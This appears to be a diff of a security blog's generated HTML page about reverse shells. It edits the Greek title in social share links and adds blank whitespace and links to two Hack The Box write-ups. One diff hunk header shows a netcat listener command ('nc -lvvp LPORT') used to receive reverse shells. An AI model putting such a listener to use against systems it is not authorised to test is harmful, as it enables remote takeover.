-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2freverse_shells%2f&text=%ce%91%ce%bd%ce%ac%cf%80%ce%bf%ce%b4%ce%b1%20%ce%ba%ce%b5%ce%bb%cf%8d%cf%86%ce%b7%20%28reverse%20shells%29&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2freverse_shells%2f&text=%ce%91%ce%bd%cf%84%ce%af%cf%83%cf%84%cf%81%ce%bf%cf%86%ce%b1%20%ce%ba%ce%b5%ce%bb%cf%8d%cf%86%ce%b7%20%28reverse%20shells%29&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
             <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2freverse_shells%2f&description=Reverse%20shells&media=https://alamot.github.io/images/shell.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2freverse_shells%2f&description=%ce%91%ce%bd%ce%ac%cf%80%ce%bf%ce%b4%ce%b1%20%ce%ba%ce%b5%ce%bb%cf%8d%cf%86%ce%b7%20%28reverse%20shells%29&media=https://alamot.github.io/images/shell.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2freverse_shells%2f&description=%ce%91%ce%bd%cf%84%ce%af%cf%83%cf%84%cf%81%ce%bf%cf%86%ce%b1%20%ce%ba%ce%b5%ce%bb%cf%8d%cf%86%ce%b7%20%28reverse%20shells%29&media=https://alamot.github.io/images/shell.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -621,6 +559,677 @@ nc -lvvp LPORT
            
            
           
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/code.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up (www.hackthebox.eu)</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node (www.hackthebox.eu)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up (www.hackthebox.eu)</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum (www.hackthebox.eu)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
           
            
            
